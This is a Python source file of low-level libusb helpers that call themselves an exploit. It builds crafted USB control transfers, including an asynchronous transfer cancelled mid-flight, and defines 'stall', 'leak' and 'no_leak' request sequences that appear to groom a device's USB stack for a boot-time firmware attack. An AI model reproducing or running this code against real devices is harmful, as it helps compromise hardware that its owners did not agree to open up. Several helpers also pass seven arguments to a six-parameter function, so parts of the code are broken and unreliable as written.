import usb, array, time, sys, struct, ctypes

usbTimeout = 10

def libusb1_create_ctrl_transfer(device, request):
  ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
  assert ptr is not None

  transfer = ptr.contents
  transfer.dev_handle = device._ctx.handle.handle
  transfer.endpoint = 0 # EP0
  transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL
  transfer.timeout = usbTimeout
  transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer
  transfer.length = len(request)
  transfer.user_data = None
  transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL
  transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER

  return ptr

def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout=usbTimeout):

    assert type(device) == usb.core.Device, "Device parameter is not a USB device"

    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
        sys.exit(1)

    global request, transfer_ptr, never_free_device
    request_timeout = int(usbTimeout) if usbTimeout >= 1 else 0
    start = time.time()
    never_free_device = device
    request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
    transfer_ptr = libusb1_create_ctrl_transfer(device, request)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0, "Async transfer unsuccessful"

    while time.time() - start < usbTimeout / 1000.0:
        pass

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0, "Async transfer unsuccessful"


def libusb_control_request(device, bmRequestType, bRequest, wValue, wIndex, dataOrwLength):

    assert type(device) == usb.core.Device, "Device parameter is not a USB device"

    try:
        buff = usb.util.create_buffer(dataOrwLength)
    except TypeError:
        buff = array.array('B', dataOrwLength)

    device._ctx.managed_open()
    recipient = bmRequestType & 3
    rqtype = bmRequestType & (3 << 5)
    if recipient == usb.util.CTRL_RECIPIENT_INTERFACE and rqtype != usb.util.CTRL_TYPE_VENDOR:
        interface_number = wIndex & 0xff
        device._ctx.managed_claim_interface(device, interface_number)
    
    ret = device._ctx.backend.ctrl_transfer(
                            device._ctx.handle,
                            bmRequestType,
                            bRequest,
                            wValue,
                            wIndex,
                            buff,
                            usbTimeout)

    if isinstance(dataOrwLength, array.array) \
            or usb.util.ctrl_direction(bmRequestType) == usb.util.CTRL_OUT:
        return ret
    elif ret != len(buff) * buff.itemsize:
        return buff[:ret]
    else:
        return buff

def control_transfer(device, bmRequestType, bRequest, wValue, wIndex, dataOrwLength):
    try:
        libusb_control_request(device, bmRequestType, bRequest, wValue, wIndex, dataOrwLength)
    except usb.core.USBError:
        pass

def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
def leak(device):    control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device): control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device):   control_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)
def usb_req_leak(device):    control_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device): control_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)